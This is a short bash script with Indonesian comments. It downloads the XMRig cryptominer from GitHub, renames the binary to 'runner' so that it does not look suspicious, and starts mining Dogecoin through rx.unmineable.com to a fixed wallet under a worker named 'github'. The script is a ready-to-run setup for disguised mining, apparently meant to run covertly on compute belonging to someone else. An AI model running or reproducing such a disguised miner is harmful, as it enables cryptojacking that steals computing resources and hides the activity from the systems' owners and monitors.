#!/bin/bash

# Update dan install tools
apt update && apt install wget tar -y

# Unduh XMRig
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
tar -xvf xmrig-6.21.3-linux-x64.tar.gz
cd xmrig-6.21.3

# Ubah nama biar nggak mencurigakan (opsional)
mv xmrig runner
chmod +x runner

# Mulai mining (pakai Unmineable)
./runner -a rx -o rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.github -p x --tls --threads=4
